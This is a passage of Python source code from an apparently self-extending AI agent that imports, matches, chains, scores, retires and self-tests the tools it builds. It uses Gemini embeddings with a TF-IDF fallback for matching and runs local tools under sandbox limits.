                           (inspection["security_reason"] or inspection["ai_flag_reason"]))
        return None

    tool_id, dest_file = stage_github_tool(picked["repo"], task_idea, inspection)
    success, output = run_staged_tool(tool_id, dest_file)
    if not success:
        log_rejected_tool(task_idea, "GitHub auto-import: isolated test run failed: " + output[:200])
        return None

    time_sensitive = is_time_sensitive(task_idea)  # network call — keep outside the lock
    with _tools_index_lock:
        index = load_tools_index()
        index.append({
            "id": tool_id, "idea": task_idea, "filepath": dest_file, "type": "local",
            "contract": "plain", "good_runs": 1, "bad_runs": 0,
            "time_sensitive": time_sensitive,
            "source": "github-import-auto", "origin_repo": picked["repo"]
        })
        save_tools_index(index)
    _tool_match_cache.clear()

    upload_msg = upload_tool_to_repo(
        tool_id, task_idea, inspection["code"],
        source="github-import-auto", origin_url=picked["url"]
    )
    print("[dreamer] auto-imported " + tool_id + " from " + picked["repo"] + ". " + upload_msg)
    return "Registered " + tool_id + " from " + picked["repo"] + ". " + upload_msg


def update_tool_trust(tool_id, was_good):
    with _tools_index_lock:
        index = load_tools_index()
        for t in index:
            if t["id"] == tool_id:
                t["good_runs"] = t.get("good_runs", 0) + (1 if was_good else 0)
                t["bad_runs"] = t.get("bad_runs", 0) + (0 if was_good else 1)
                t["last_used"] = time.time()
        save_tools_index(index)

def update_tool_url(tool_id, new_url):
    """
    Used by lanes whose reruns land at a new, unique URL each time (e.g.
    the video lane, where every render is committed under a fresh
    videos/<run_id>/ path so old links keep working) — keeps the tools
    index pointing at the latest actually-existing artifact.
    """
    with _tools_index_lock:
        index = load_tools_index()
        for t in index:
            if t["id"] == tool_id:
                t["url"] = new_url
        save_tools_index(index)

# ============================================================
# CHECK-IN — agent interviews the user about recent decisions
# Pulls real signal from tools_index.json + agent_lessons.txt +
# failure_counts.json, asks sharp (not generic) questions, and
# writes answers back into agent_lessons.txt as first-class lessons.
# ============================================================

def _pick_checkin_subjects(index, max_items=3):
    """
    Picks recent tools worth asking about: anything with a notable trust
    signal (several bad_runs, or several good_runs after a rough start),
    or anything from a github-import / spawned-agent source (less proven).
    Falls back to most-recent tools if nothing stands out.
    """
    scored = []
    for t in index:
        good = t.get("good_runs", 0)
        bad = t.get("bad_runs", 0)
        notability = bad * 2 + (1 if t.get("source") == "github-import" else 0)
        scored.append((notability, t))
    scored.sort(key=lambda x: x[0], reverse=True)
    picked = [t for score, t in scored if score > 0][:max_items]
    if not picked:
        picked = index[-max_items:] if index else []
    return picked

def generate_checkin_questions():
    """
    Builds 2-3 specific questions by comparing recent tool/agent activity
    against existing lessons text. Returns a list of question strings.
    Returns [] if there's not enough data yet for a meaningful check-in.
    """
    index = load_tools_index()
    if not index:
        return []

    subjects = _pick_checkin_subjects(index)
    if not subjects:
        return []

    subjects_summary = ""
    for t in subjects:
        subjects_summary += (
            "- " + t["id"] + ": \"" + t.get("idea", "")[:80] + "\" "
            "(good_runs=" + str(t.get("good_runs", 0)) +
            ", bad_runs=" + str(t.get("bad_runs", 0)) +
            ", source=" + t.get("source", "self-built") + ")\n"
        )

    existing_lessons = load_lessons()
    failure_counts = {}
    if os.path.exists(FAILURE_COUNTS_FILE):
        try:
            failure_counts = json.loads(read_file(FAILURE_COUNTS_FILE))
        except Exception:
            failure_counts = {}
    failure_summary = ", ".join(k + "=" + str(v) for k, v in failure_counts.items()) or "(none recorded)"

    prompt = (
        "You are reviewing your own recent work to ask your user 2-3 sharp, "
        "specific questions — NOT generic ones like 'how am I doing'.\n\n"
        "Recent tools/agents worth discussing:\n" + subjects_summary + "\n"
        "Lessons already learned (existing preferences):\n" +
        (existing_lessons if existing_lessons else "(none yet)") + "\n\n"
        "Failure categories seen so far: " + failure_summary + "\n\n"
        "For each question: reference a SPECIFIC tool/agent above by id and what "
        "happened with it, then ask one clear preference question that would let "
        "you act differently next time. Avoid restating what's already covered "
        "in existing lessons.\n\n"
        "Reply with ONLY the questions, one per line, no numbering, no preamble."
    )
    response = ask_ai(prompt).strip()
    if not response:
        return []
    questions = [q.strip("- ").strip() for q in response.split("\n") if q.strip()]
    return questions[:3]

def run_checkin():
    """
    Interactive check-in: asks the generated questions one at a time,
    collects the user's free-text answers, and writes each as a new
    lesson line in agent_lessons.txt (same file/format reflect_on_failure
    already uses), tagged [checkin] so it's distinguishable from
    failure-derived lessons.
    """
    questions = generate_checkin_questions()
    if not questions:
        print("Not enough activity yet for a meaningful check-in. Build a few more tools first.")
        return

    print("\n=== Check-in ===")
    print("A few questions based on what I've actually built recently:\n")

    current_lessons = load_lessons()
    new_lines = []
    for q in questions:
        print(q)
        answer = input("> ").strip()
        if answer and answer.lower() not in ("skip", "no", "n/a"):
            new_lines.append("[checkin] Q: " + q + " | A: " + answer)
        print()

    if not new_lines:
        print("No answers recorded.")
        return

    updated = current_lessons
    for line in new_lines:
        updated = (updated + "\n- " + line).strip() if updated else "- " + line
    write_file(LESSONS_FILE, updated)
    print("Saved " + str(len(new_lines)) + " new preference(s) to lessons.")
    print("================\n")

def is_tool_trustworthy(tool):
    good = tool.get("good_runs", 0)
    bad = tool.get("bad_runs", 0)
    if good + bad < 2:
        return True
    return good / (good + bad) >= 0.6

def retire_tool(tool, reason="Trust score dropped."):
    with _tools_index_lock:
        index = load_tools_index()
        index = [t for t in index if t["id"] != tool["id"]]
        save_tools_index(index)
    if tool.get("type") == "local" and os.path.exists(tool.get("filepath", "")):
        shutil.move(tool["filepath"], os.path.join(TOOLS_RETIRED_DIR, tool["id"] + ".py"))
    write_file(os.path.join(TOOLS_RETIRED_DIR, tool["id"] + "_reason.txt"),
               "Retired: " + reason + "\nIdea: " + tool["idea"])

# ------------------------------------------------------------
# FEATURE 2: Tool usage graph + auto-retirement
# ------------------------------------------------------------
# good_runs / bad_runs / last_used are already tracked per tool, but
# nothing ever acts on a tool that's simply never called again. This
# auto-retires tools that have gone dead-quiet for a long time, separate
# from (and much more conservative than) the trust-based retire_tool()
# bar above, which only fires on actively failing tools.
AUTO_RETIRE_DEAD_DAYS = DECAY_UNUSED_DAYS * 4  # well past "stale" before we actually remove it

def tool_usage_graph():
    """Returns tools_index sorted by total call volume, most-used first."""
    index = load_tools_index()
    return sorted(index, key=lambda t: t.get("good_runs", 0) + t.get("bad_runs", 0), reverse=True)

def auto_retire_dead_tools():
    """
    Retires tools that have been idle for AUTO_RETIRE_DEAD_DAYS straight
    — long enough that "stale" (tool_decay_check's 7-day bar) clearly
    isn't a fluke. Tools that have never been used even once are left
    alone here (too new to judge); this only targets tools that *were*
    used and then went quiet. Returns a list of retired tool ids.
    """
    now = time.time()
    retired = []
    for t in load_tools_index():
        last_used = t.get("last_used")
        if last_used is None:
            continue
        days_idle = (now - last_used) / 86400
        if days_idle >= AUTO_RETIRE_DEAD_DAYS:
            retire_tool(t, reason="Unused for " + str(round(days_idle, 1)) + " days (auto-retired).")
            retired.append(t["id"])
    return retired

def builtin_usage_graph():
    """Prints tools ranked by call volume, flags the dead-but-not-yet-retired tail."""
    ranked = tool_usage_graph()
    if not ranked:
        print("No tools registered yet.")
        return
    print("=== Tool Usage Graph (most-used first) ===")
    for t in ranked:
        total = t.get("good_runs", 0) + t.get("bad_runs", 0)
        last_used = t.get("last_used")
        recency = (time.strftime("%Y-%m-%d", time.localtime(last_used)) if last_used else "never")
        print("  " + t["id"] + ": " + str(total) + " calls (" + str(t.get("good_runs", 0)) + "g/" +
              str(t.get("bad_runs", 0)) + "b), last used " + recency + " — " + t.get("idea", "")[:60])
    print("===========================================")

def validate_tool_output(idea, output):
    prompt = """A tool was supposed to do this: """ + idea + """
It produced: """ + str(output)[:800] + """
Is this a reasonable result? Reply with ONLY: VALID or INVALID"""
    return ask_ai(prompt).strip().upper() == "VALID"

_tool_match_cache = {}

# ============================================================
# SEMANTIC SIMILARITY (lightweight TF-IDF, no external deps)
# ============================================================
# Used to narrow tool-matching candidates before asking the AI (saves
# tokens as the tool registry grows) and to short-circuit obviously
# strong matches without an AI call at all.

import math as _math
from collections import Counter as _Counter

_STOPWORDS = {
    "a", "an", "the", "to", "of", "for", "and", "or", "in", "on", "with",
    "that", "this", "is", "are", "be", "it", "from", "as", "at", "by", "into"
}

def _tokenize(text):
    return [w for w in re.findall(r"[a-z0-9]+", text.lower()) if w not in _STOPWORDS and len(w) > 1]

def _build_tfidf(documents):
    """documents: dict of id -> text. Returns (tfidf_vectors: dict id -> Counter, idf: dict word -> float)."""
    tokenized = {doc_id: _tokenize(text) for doc_id, text in documents.items()}
    df = _Counter()
    for tokens in tokenized.values():
        for w in set(tokens):
            df[w] += 1
    n_docs = max(len(documents), 1)
    idf = {w: _math.log((n_docs + 1) / (count + 1)) + 1 for w, count in df.items()}
    vectors = {}
    for doc_id, tokens in tokenized.items():
        tf = _Counter(tokens)
        vectors[doc_id] = {w: tf[w] * idf.get(w, 1.0) for w in tf}
    return vectors, idf

def _cosine_sim(vec_a, vec_b):
    common = set(vec_a) & set(vec_b)
    if not common:
        return 0.0
    dot = sum(vec_a[w] * vec_b[w] for w in common)
    norm_a = _math.sqrt(sum(v * v for v in vec_a.values()))
    norm_b = _math.sqrt(sum(v * v for v in vec_b.values()))
    if norm_a == 0 or norm_b == 0:
        return 0.0
    return dot / (norm_a * norm_b)

def _semantic_rank_tfidf(query, candidates):
    """
    candidates: dict of id -> text (e.g. tool_id -> idea).
    Returns list of (id, score) sorted by descending similarity to query.
    Pure TF-IDF cosine similarity — cheap, deterministic, no AI call.
    Used directly when GEMINI_API_KEY isn't set, and as the fallback if
    the embedding path below fails outright (network down, rate limited).
    """
    if not candidates:
        return []
    docs = dict(candidates)
    docs["__query__"] = query
    vectors, _ = _build_tfidf(docs)
    query_vec = vectors.pop("__query__")
    scored = [(doc_id, _cosine_sim(query_vec, vec)) for doc_id, vec in vectors.items()]
    scored.sort(key=lambda x: x[1], reverse=True)
    return scored

# ============================================================
# SEMANTIC SIMILARITY (Gemini embeddings, TF-IDF as fallback)
# ============================================================
# BUG FIX / UPGRADE: semantic_rank() used to be pure word-frequency TF-IDF,
# which matches on shared vocabulary, not meaning — "cut video clips" and
# "trim footage together" score low even though they're the same request.
# Below swaps in real embeddings from Gemini (gemini-embedding-001) while
# keeping the exact same call signature and return shape (list of
# (id, score) tuples) so every existing caller — find_matching_tool,
# find_matching_github_tool, find_matching_web_tool, the dreamer's
# lesson/question ranking, etc. — needs zero changes.
#
# Storage stays file-based, consistent with the rest of this codebase:
# embeddings are cached to disk keyed by a hash of their exact text, so a
# tool/idea whose text hasn't changed is never re-embedded on a later
# call — only genuinely new or edited candidates cost an API call. This
# matters because find_matching_tool() etc. call semantic_rank() against
# the FULL tool registry on every single new idea, and that registry only
# grows.

GEMINI_EMBEDDING_MODEL = "gemini-embedding-001"
EMBEDDING_CACHE_FILE = workpath("embedding_cache.json")
EMBEDDING_BATCH_SIZE = 100  # chunk size for batchEmbedContents calls

# BUG-FIX-STYLE NOTE (pre-empting the same class of bug fixed elsewhere in
# this file for tools_index.json/agents_index.json): semantic_rank() can be
# called from the main thread AND the dreamer thread. Without a lock, two
# concurrent calls that both need to embed new candidates could each load
# the same stale cache, both add their own new entries, and the second
# save() would silently clobber the first's additions. Same fix pattern:
# one lock guarding every read-modify-write of the cache file.
_embedding_cache_lock = threading.Lock()

def _embedding_cache_key(text, task_type):
    # task_type included because RETRIEVAL_QUERY and RETRIEVAL_DOCUMENT
    # embeddings for the same text are NOT the same vector — caching them
    # under one key would silently corrupt similarity scores.
    return hashlib.sha256((task_type + "\x00" + text).encode("utf-8")).hexdigest()

def load_embedding_cache():
    return read_json_file(EMBEDDING_CACHE_FILE, {})

def save_embedding_cache(cache):
    write_file(EMBEDDING_CACHE_FILE, json.dumps(cache))

def _gemini_embed_batch(texts, task_type):
    """
    Embeds a list of texts in one request via Gemini's batchEmbedContents.
    Returns a list of vectors (list of floats) in the same order as
    `texts`, or None on any failure (network error, non-200, malformed
    response) — callers must treat None as "embeddings unavailable,
    fall back to TF-IDF" rather than partially trusting the result.
    """
    if not GEMINI_API_KEY:
        return None
    if not texts:
        return []
    requests_body = [
        {
            "model": "models/" + GEMINI_EMBEDDING_MODEL,
            "content": {"parts": [{"text": t}]},
            "taskType": task_type
        }
        for t in texts
    ]
    try:
        response = requests.post(
            "https://generativelanguage.googleapis.com/v1beta/models/" +
            GEMINI_EMBEDDING_MODEL + ":batchEmbedContents",
            headers={"x-goog-api-key": GEMINI_API_KEY, "Content-Type": "application/json"},
            json={"requests": requests_body},
            timeout=30
        )
    except requests.exceptions.RequestException:
        return None
    if response.status_code != 200:
        return None
    try:
        data = response.json()
        embeddings = data["embeddings"]
        if len(embeddings) != len(texts):
            return None
        return [e["values"] for e in embeddings]
    except (KeyError, TypeError, ValueError):
        return None

def _cosine_sim_vec(vec_a, vec_b):
    if not vec_a or not vec_b or len(vec_a) != len(vec_b):
        return 0.0
    dot = sum(a * b for a, b in zip(vec_a, vec_b))
    norm_a = _math.sqrt(sum(a * a for a in vec_a))
    norm_b = _math.sqrt(sum(b * b for b in vec_b))
    if norm_a == 0 or norm_b == 0:
        return 0.0
    return dot / (norm_a * norm_b)

def get_embedding(text, task_type="RETRIEVAL_DOCUMENT"):
    """
    Single-text convenience wrapper around the batch path, with disk
    caching. Returns a vector (list of floats) or None on failure.
    Prefer semantic_rank() for ranking many candidates at once — it
    batches uncached texts into far fewer API calls than calling this
    in a loop would.
    """
    key = _embedding_cache_key(text, task_type)
    with _embedding_cache_lock:
        cache = load_embedding_cache()
        if key in cache:
            return cache[key]
    vectors = _gemini_embed_batch([text], task_type)
    if not vectors:
        return None
    with _embedding_cache_lock:
        cache = load_embedding_cache()
        cache[key] = vectors[0]
        save_embedding_cache(cache)
    return vectors[0]

def semantic_rank(query, candidates):
    """
    candidates: dict of id -> text (e.g. tool_id -> idea).
    Returns list of (id, score) sorted by descending similarity to query,
    same shape as the old TF-IDF-only version.

    Tries real Gemini embeddings first (meaning-based similarity, not
    just shared vocabulary). Falls back to TF-IDF whenever embeddings
    aren't usable: no GEMINI_API_KEY set, a network failure, a rate
    limit, or a malformed response — ranking a candidate wrong is much
    worse than not embedding it, but ranking nothing at all (raising)
    would take down every caller (find_matching_tool, the dreamer, etc),
    so this always degrades to the old deterministic method rather than
    erroring.
    """
    if not candidates:
        return []
    if not GEMINI_API_KEY:
        return _semantic_rank_tfidf(query, candidates)

    query_vec = get_embedding(query, task_type="RETRIEVAL_QUERY")
    if query_vec is None:
        return _semantic_rank_tfidf(query, candidates)

    with _embedding_cache_lock:
        cache = load_embedding_cache()
        cached_vecs = {}
        to_embed_ids = []
        to_embed_texts = []
        for doc_id, text in candidates.items():
            key = _embedding_cache_key(text, "RETRIEVAL_DOCUMENT")
            if key in cache:
                cached_vecs[doc_id] = cache[key]
            else:
                to_embed_ids.append(doc_id)
                to_embed_texts.append(text)

    # Embed only what isn't already cached, chunked to keep individual
    # requests reasonably sized as the registry grows into the hundreds.
    newly_embedded = {}
    for i in range(0, len(to_embed_texts), EMBEDDING_BATCH_SIZE):
        chunk_ids = to_embed_ids[i:i + EMBEDDING_BATCH_SIZE]
        chunk_texts = to_embed_texts[i:i + EMBEDDING_BATCH_SIZE]
        vectors = _gemini_embed_batch(chunk_texts, "RETRIEVAL_DOCUMENT")
        if vectors is None:
            # Whole call failed (not just one item) — bail out to TF-IDF
            # entirely rather than silently ranking against a partial,
            # inconsistent mix of embedded and unembedded candidates.
            if not cached_vecs:
                return _semantic_rank_tfidf(query, candidates)
            break
        for doc_id, vec in zip(chunk_ids, vectors):
            newly_embedded[doc_id] = vec

    if newly_embedded:
        with _embedding_cache_lock:
            cache = load_embedding_cache()
            for doc_id in newly_embedded:
                cache[_embedding_cache_key(candidates[doc_id], "RETRIEVAL_DOCUMENT")] = newly_embedded[doc_id]
            save_embedding_cache(cache)

    all_vecs = {**cached_vecs, **newly_embedded}
    scored = [(doc_id, _cosine_sim_vec(query_vec, all_vecs[doc_id]))
              for doc_id in candidates if doc_id in all_vecs]
    # Any candidate whose embedding failed mid-batch and never got
    # retried this call just doesn't appear — better than a fabricated
    # score. It'll simply get embedded (and included) on the next call.
    scored.sort(key=lambda x: x[1], reverse=True)
    return scored

# CALIBRATION NOTE (2026-07-03, embeddings upgrade): both constants below
# were originally tuned for TF-IDF cosine similarity, where unrelated
# text pairs score near 0 and only near-duplicates score high. Real
# Gemini embedding cosine similarity behaves differently — even
# semantically UNRELATED pairs commonly land around 0.3-0.5, and true
# near-duplicates often don't exceed 0.9. The old values (0.75 / 0.12)
# would have been miscalibrated for embeddings: the 0.12 floor in
# particular would have stopped filtering out almost anything. Bumped to
# conservative embedding-typical starting points below. find_matching_tool()
# already logs every match's score via log_decision("tool_match", ...),
# so after some real usage, pull the score distribution from
# decisions_log.json and retune these two numbers against your actual
# data rather than trusting this starting guess indefinitely.
SEMANTIC_AUTOMATCH_THRESHOLD = 0.88   # skip the AI call entirely above this similarity
SEMANTIC_PREFILTER_TOP_K = 8          # only show the AI this many candidates, not the whole registry
# BUG FIX: find_matching_github_tool/find_matching_web_tool/find_matching_unity_tool
# used to show the AI candidates regardless of how (dis)similar they actually
# were, then ask a loosely-worded "does an existing tool already do this?"
# question with only two options (a specific id, or NONE) — no way to express
# "none of these are close enough to even guess between." That biases the AI
# toward picking SOMETHING off the list, so a genuinely new, unrelated request
# could get matched to an old, semantically-distant project and reused/reported
# on instead of actually being built. Below this similarity score, the best
# candidate isn't a plausible match at all, so the AI call is skipped
# entirely and the request is treated as new — this is a floor, not a
# guarantee: still relies on the (now more conservative) AI prompt above it.
SEMANTIC_PREFILTER_MIN_SCORE = 0.35


def find_matching_tool(idea):
    if idea in _tool_match_cache:
        cached_id = _tool_match_cache[idea]
        for t in load_tools_index():
            if t["id"] == cached_id and is_tool_trustworthy(t):
                return t
        del _tool_match_cache[idea]
    index = [t for t in load_tools_index() if t.get("type", "local") == "local"]
    if not index:
        return None

    # Semantic prefilter — narrows candidates via cheap TF-IDF similarity
    # before spending AI tokens, and short-circuits very strong matches.
    ranked = semantic_rank(idea, {t["id"]: t["idea"] for t in index})
    if ranked and ranked[0][1] >= SEMANTIC_AUTOMATCH_THRESHOLD:
        best = next((t for t in index if t["id"] == ranked[0][0]), None)
        if best and is_tool_trustworthy(best):
            log_decision("tool_match", best["id"], candidates=[t["id"] for t in index],
                          reason="semantic auto-match (score %.2f) for: " % ranked[0][1] + idea)
            _tool_match_cache[idea] = best["id"]
            return best

    top_ids = {doc_id for doc_id, _ in ranked[:SEMANTIC_PREFILTER_TOP_K]} if ranked else {t["id"] for t in index}
    narrowed = [t for t in index if t["id"] in top_ids] or index
    listing = "\n".join(t["id"] + ": " + t["idea"] for t in narrowed)
    prompt = """Tools already built:
""" + listing + """

New request: """ + idea + """

Does an existing tool already do this? Reply with ONLY the tool id or NONE."""
    answer = ask_ai(prompt).strip()
    log_decision("tool_match", answer, candidates=[t["id"] for t in narrowed], reason="AI picked from semantically-narrowed tools for: " + idea)
    for t in narrowed:
        if t["id"] == answer and is_tool_trustworthy(t):
            _tool_match_cache[idea] = t["id"]
            return t
    return None

def find_matching_github_tool(idea):
    github_tools = [t for t in load_tools_index() if t.get("type") == "github"]
    if not github_tools:
        return None
    ranked = semantic_rank(idea, {t["id"]: t["idea"] for t in github_tools})
    # BUG FIX: bail out before ever asking the AI if nothing is even
    # remotely similar — see SEMANTIC_PREFILTER_MIN_SCORE for why.
    if not ranked or ranked[0][1] < SEMANTIC_PREFILTER_MIN_SCORE:
        return None
    top_ids = {doc_id for doc_id, _ in ranked[:SEMANTIC_PREFILTER_TOP_K]}
    narrowed = [t for t in github_tools if t["id"] in top_ids] or github_tools
    listing = "\n".join(t["id"] + ": " + t["idea"] for t in narrowed)
    prompt = """GitHub tools already built:
""" + listing + """

New request: """ + idea + """

Does an existing tool already do this — same purpose and functionality, not just a similar topic or category? Only answer with its id if you are confident it is genuinely the same deliverable. If none is a confident match, or you're unsure, reply NONE — reusing the wrong project is worse than building a new one.
Reply with ONLY the tool id or NONE."""
    answer = ask_ai(prompt).strip()
    for t in narrowed:
        if t["id"] == answer and is_tool_trustworthy(t):
            return t
    return None

def find_matching_web_tool(idea):
    web_tools = [t for t in load_tools_index() if t.get("type") == "web"]
    if not web_tools:
        return None
    ranked = semantic_rank(idea, {t["id"]: t["idea"] for t in web_tools})
    if not ranked or ranked[0][1] < SEMANTIC_PREFILTER_MIN_SCORE:
        return None
    top_ids = {doc_id for doc_id, _ in ranked[:SEMANTIC_PREFILTER_TOP_K]}
    narrowed = [t for t in web_tools if t["id"] in top_ids] or web_tools
    listing = "\n".join(t["id"] + ": " + t["idea"] for t in narrowed)
    prompt = """Web tools already built:
""" + listing + """

New request: """ + idea + """

Does an existing tool already do this — same purpose and functionality, not just a similar topic or category? Only answer with its id if you are confident it is genuinely the same deliverable. If none is a confident match, or you're unsure, reply NONE — reusing the wrong project is worse than building a new one.
Reply with ONLY the tool id or NONE."""
    answer = ask_ai(prompt).strip()
    for t in narrowed:
        if t["id"] == answer and is_tool_trustworthy(t):
            return t
    return None

def find_tool_for_step(step_text):
    return find_matching_tool(step_text)

# ============================================================
# TOOL CHAINER
# ============================================================

def plan_tool_chain(request):
    """
    Asks AI whether the request is best handled by chaining multiple tools.
    Returns a list of dicts: [{"tool": ..., "instruction": ...}, ...]
    or [] if no useful chain found.
    """
    index = [t for t in load_tools_index() if t.get("type", "local") == "local"]
    if len(index) < 2:
        return []
    listing = "\n".join(t["id"] + ": " + t["idea"] for t in index)
    prompt = """You have these tools:
""" + listing + """

User request: """ + request + """

Can this be handled better by chaining 2-3 tools in sequence, where the output of one feeds the next?
If YES, reply in this exact format (one tool per line):
CHAIN:
tool_id | what to do with it
tool_id | what to do with its output

If NO or only one tool is needed, reply: NONE"""
    answer = ask_ai(prompt).strip()
    if answer.upper() == "NONE" or "CHAIN:" not in answer:
        return []
    chain = []
    tool_map = {t["id"]: t for t in index}
    for line in answer.split("\n"):
        line = line.strip()
        if "|" not in line or line.upper().startswith("CHAIN"):
            continue
        parts = line.split("|", 1)
        tool_id = parts[0].strip()
        instruction = parts[1].strip() if len(parts) > 1 else ""
        if tool_id in tool_map and is_tool_trustworthy(tool_map[tool_id]):
            chain.append({"tool": tool_map[tool_id], "instruction": instruction})
    if chain:
        log_decision("chain_plan", " -> ".join(s["tool"]["id"] for s in chain),
                      candidates=[t["id"] for t in index], reason="Chained for request: " + request)
    return chain if len(chain) >= 2 else []

def run_tool_chain(chain, original_request):
    """
    Runs tools in sequence, piping each output as context into the next.
    Returns (success, final_output, tool_ids_used).
    """
    context = original_request
    tool_ids_used = []
    for step in chain:
        tool = step["tool"]
        instruction = step["instruction"]
        print("  [chain] running " + tool["id"] + ": " + tool["idea"][:60])
        success, output = run_tool_with_input(tool, context)
        update_tool_trust(tool["id"], success)
        if not success:
            print("  [chain] " + tool["id"] + " failed: " + output[:200])
            return False, output, tool_ids_used
        tool_ids_used.append(tool["id"])
        context = instruction + "\n\nPrevious output:\n" + str(output)
    if len(tool_ids_used) >= 2:
        log_cousage(tool_ids_used)
        # Build chain_steps for agent spawner (needs tool metadata)
        tool_map = {t["id"]: t for t in load_tools_index()}
        chain_steps = []
        for step, tid in zip(chain, tool_ids_used):
            t = tool_map.get(tid, step["tool"])
            chain_steps.append({
                "tool_id": tid,
                "idea": t.get("idea", ""),
                "filepath": t.get("filepath", ""),
                "instruction": step["instruction"]
            })
        maybe_spawn_agent_from_chain(tool_ids_used, chain_steps)
    return True, output, tool_ids_used


def run_existing_github_tool(tool, timeout_seconds=None):
    """
    Actually exercises a "github" or "video" type tool by triggering the
    run.yml workflow ALREADY COMMITTED in the tool's own repo — the remote
    equivalent of run_existing_tool() running a local tool's current file
    on disk. Deliberately does NOT repush any code (unlike
    validate_python_on_github()/validate_video_on_github(), which are
    build/repair-time functions that overwrite the repo with whatever is
    currently sitting in GITHUB_CODE_FILE/VIDEO_CODE_FILE) — this checks
    the tool exactly as it currently exists, so a showdown or health check
    can't accidentally clobber a working tool's repo with unrelated
    in-progress build content.

    Both "github" and "video" tools use the same run.yml convention (see
    ensure_python_runner_yaml/ensure_video_runner_yaml), so one function
    covers both. Real GitHub Actions runs take real minutes — this blocks
    for up to timeout_seconds waiting for the result, same tradeoff
    validate_video_on_github() already accepts for video renders.
    """
    repo_name = tool.get("repo_name")
    if not repo_name:
        return False, "Tool has no repo_name to run."
    username = get_github_username()
    if not username:
        return False, "Could not determine GitHub username."
    if timeout_seconds is None:
        timeout_seconds = 600 if tool.get("type") == "video" else 300
    previous_run = get_latest_run(repo_name, "run.yml")
    previous_run_id = previous_run.get("id") if previous_run is not None else None
    triggered, msg = trigger_github_workflow(repo_name, "run.yml")
    if not triggered:
        return False, "Could not trigger workflow: " + msg
    run = wait_for_run_completion(repo_name, previous_run_id=previous_run_id, timeout_seconds=timeout_seconds)
    if not run or run.get("id") == previous_run_id:
        return False, "Run did not complete within " + str(timeout_seconds) + "s timeout."
    if run.get("conclusion") == "success":
        return True, "Ran successfully on GitHub Actions (run " + str(run.get("id")) + ")."
    return False, get_run_logs(repo_name, run.get("id"))[-3000:]

def run_existing_tool(tool):
    # BUG FIX: this used to assume every tool has a "filepath" key and went
    # straight to subprocess.run(["python3", tool["filepath"]]). That's only
    # true for "local" tools. "web" tools store a url/folder, "github" and
    # "video" tools store a repo_name/url and run remotely via GitHub
    # Actions (see build_and_fix_on_github / build_and_fix_video_workflow) —
    # none of them have a filepath. Calling this on one of those raised an
    # uncaught KeyError: 'filepath', which crashed callers like
    # tool_showdown()/auto_prune_duplicates(), the scheduler, and the
    # dreamer's decay-fix path (get_decaying_tools() doesn't filter by
    # type, so a declining github/web/video tool could reach here directly
    # via red_team_and_fix_one_tool(target_tool=...) too).
    ttype = tool.get("type", "local")
    if ttype == "web":
        update_tool_trust(tool["id"], True)
        return True, "This is a web tool. Open it here: " + tool.get("url", "(no url saved)")
    if ttype in ("github", "video"):
        # Real check: actually trigger the tool's existing GitHub Actions
        # run and judge it on the real result, instead of a trivial no-op
        # success — this used to make github/video tools "win" every
        # tool_showdown() automatically regardless of whether they still
        # worked, which could get a genuinely-working local tool wrongly
        # retired as the "loser". Note this can take a few real minutes.
        ok, output = run_existing_github_tool(tool)
        update_tool_trust(tool["id"], ok)
        if not is_tool_trustworthy(tool):
            retire_tool(tool)
        return ok, output
    if not tool.get("filepath"):
        update_tool_trust(tool["id"], False)
        return False, "Tool has no filepath and type '" + ttype + "' is not runnable locally."
    try:
        result = subprocess.run(
            ["python3", tool["filepath"]], capture_output=True, text=True,
            timeout=CODE_TIMEOUT_SECONDS,
            preexec_fn=_sandbox_limits if os.name != "nt" else None
        )
        ok = result.returncode == 0
        output = result.stdout if ok else result.stderr
        if ok:
            ok = validate_tool_output(tool["idea"], output)
        update_tool_trust(tool["id"], ok)
        if not is_tool_trustworthy(tool):
            retire_tool(tool)
        return ok, output
    except subprocess.TimeoutExpired:
        update_tool_trust(tool["id"], False)
        return False, "Timed out."

def run_tool_with_input(tool, input_text):
    if tool.get("type") == "web":
        update_tool_trust(tool["id"], True)
        return True, "This is a web tool. Open it here: " + tool.get("url", "(no url saved)")
    if tool.get("contract") != "json":
        return run_existing_tool(tool)
    payload = json.dumps({"input": input_text})
    try:
        result = subprocess.run(
            ["python3", tool["filepath"]],
            input=payload, capture_output=True, text=True, timeout=CODE_TIMEOUT_SECONDS,
            preexec_fn=_sandbox_limits if os.name != "nt" else None
        )
        if result.returncode != 0:
            update_tool_trust(tool["id"], False)
            return False, result.stderr
        data = json.loads(result.stdout.strip())
        output = data.get("output", "")
        ok = validate_tool_output(tool["idea"], output)
        update_tool_trust(tool["id"], ok)
        if not is_tool_trustworthy(tool):
            retire_tool(tool)
        return ok, output
    except Exception as e:
        update_tool_trust(tool["id"], False)
        return False, str(e)

# ============================================================
# SELF-TEST SUITE (exercises every registered tool + built-in function)
# ============================================================

def _generate_test_input_for_tool(tool):
    """
    Asks the AI for one short, realistic test question based on the tool's
    own description, so the self-test isn't just re-feeding the tool its
    own idea text verbatim. Falls back to the idea text itself if the AI
    call fails or is rate-limited (a real, observed failure mode in this
    project) — a slightly less realistic test input is far better than
    aborting the whole self-test run over one flaky API call.
    """
    idea = tool.get("idea", "")
    prompt = ('You are testing a tool with this description: "' + idea + '". '
               'Write ONE short, realistic test question or input a user might '
               'give this tool. Reply with ONLY the test input text, nothing else.')
    try:
        response = ask_ai(prompt).strip().strip('"').strip("'")
        if response and not response.upper().startswith("ERROR") and 0 < len(response) < 300:
            return response
    except Exception:
        pass
    return idea

def _generate_grounded_test_input_for_tool(tool):
    """
    GROUNDED SELF-TEST: for a dreamer-built tool that has a stored
    source_context (the real web material the idea was actually pulled
    from — see register_tool()/scan_web_for_tool_idea()), ask the AI for a
    real question drawn directly from that source, instead of a generic
    question re-derived from the one-line idea summary.

    Why this matters: _generate_test_input_for_tool() only ever sees the
    idea string ("a tool that fetches X"), so its test question is really
    just a paraphrase of a paraphrase — it can't catch cases where the tool
    handles the *general shape* of its idea but breaks on the actual, messy
    real-world question that inspired it. Testing against the original
    source material closes that gap.

    Falls back to _generate_test_input_for_tool() for tools with no stored
    source_context (built-ins, propose_new_idea()-sourced tools, older
    tools registered before this field existed) or if the AI call fails.
    """
    source_context = tool.get("source_context")
    idea = tool.get("idea", "")
    if not source_context:
        return _generate_test_input_for_tool(tool)
    prompt = (
        'A tool was built with this description: "' + idea + '". '
        'It was inspired by this real source material:\n' + source_context[:1500] +
        '\n\nWrite ONE short, realistic question a real user could ask, grounded in '
        'specifics from that source material (not a generic paraphrase of the '
        'description) — the kind of concrete question that would actually '
        'exercise this tool the way it would be used for real. '
        'Reply with ONLY the test input text, nothing else.'
    )
    try:
        response = ask_ai(prompt).strip().strip('"').strip("'")
